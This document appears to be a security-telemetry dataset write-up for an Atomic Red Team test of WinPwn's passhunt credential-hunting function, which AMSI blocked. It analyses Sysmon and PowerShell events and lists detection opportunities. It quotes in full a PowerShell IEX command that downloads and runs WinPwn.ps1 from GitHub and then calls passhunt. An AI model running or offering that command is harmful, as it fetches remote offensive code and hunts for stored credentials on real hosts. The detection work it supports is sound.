# T1552.001-10: Credentials In Files — WinPwn - passhunt

## Technique Context

Credentials in Files (T1552.001) covers the discovery of credentials stored in plaintext or weakly protected files on disk. WinPwn is a PowerShell post-exploitation framework by S3cur3Th1sSh1t that wraps numerous credential hunting and exploitation modules. The `passhunt` function searches common file locations for hardcoded passwords. WinPwn is loaded via an IEX download from GitHub at runtime, making it a fileless execution pattern.

## What This Dataset Contains

The attack command is captured in both Sysmon EID 1 and PowerShell 4104:

> `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')` followed by `passhunt -local $true -noninteractive`

The script block appears twice in the 4104 log (outer and inner blocks). A PowerShell module log event (EID 4103) confirms `New-Object net.webclient` was invoked, documenting the download attempt. A Sysmon EID 22 DNS query records the resolution of `raw.githubusercontent.com` to GitHub's CDN IPs (`185.199.108-111.133`), confirming network egress occurred. A PowerShell 4100 error event records AMSI blocking the WinPwn content:

> `This script contains malicious content and has been blocked by your antivirus software.`
> `Fully Qualified Error ID = ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand`

The download succeeded (DNS resolved, `net.webclient` executed) but AMSI blocked the content when IEX attempted to evaluate it. Sysmon EID 10 records PowerShell opening both `whoami.exe` (the ART pre-flight check) and the attack `powershell.exe` child process with full access (`0x1FFFFF`). Five EID 11 file creates are present — more than typical — likely reflecting WinPwn's partial initialization before AMSI terminated it.

The dataset has 38 Sysmon events: 25 EID 7 image loads (two PowerShell instances), 5 EID 11 file creates, 3 EID 17 pipe creates, 2 EID 10 process access, 2 EID 1 process creates, 1 EID 22 DNS query.

## What This Dataset Does Not Contain (and Why)

The `passhunt` function never ran. AMSI blocked the WinPwn.ps1 content before it was parsed. There are no file enumeration events, no credential file reads, and no findings. The Sysmon file create events reflect PowerShell runtime artifacts, not passhunt's file discovery activity. There are no Sysmon network connection events despite the DNS query succeeding — the HTTP download is handled by `net.webclient` internally and does not trigger a Sysmon EID 3 in this configuration.

## Assessment

This dataset represents a fileless credential hunting attempt blocked at the AMSI layer. It provides strong detection surface at two layers: the network layer (DNS query for raw.githubusercontent.com from powershell.exe) and the scripting layer (AMSI block error in PowerShell 4100, script block content in 4104). The actual passhunt credential discovery behavior is entirely absent — the dataset documents an attempt, not a success.

## Detection Opportunities Present in This Data

- **PowerShell 4104 script block**: `iex(new-object net.webclient).downloadstring(` from a GitHub raw URL followed by `passhunt` is a high-confidence indicator. The specific commit hash in the URL (`121dcee26a7aca368821563cbe92b2b5638c5773`) enables hash-based IOC matching.
- **PowerShell 4100 AMSI block**: `ScriptContainedMaliciousContent` with the full host application path is an explicit detection event generated by Defender.
- **Sysmon EID 22 DNS query**: `powershell.exe` querying `raw.githubusercontent.com` is suspicious in most enterprise environments and is a reliable precursor indicator for fileless execution attempts.
- **`net.webclient` instantiation** (EID 4103): `New-Object net.webclient` followed by `.downloadstring()` to a raw GitHub URL is a textbook fileless execution pattern.
- **Security 4688 / Sysmon EID 1 command line**: The full invocation is in the process creation record for the child powershell.exe.
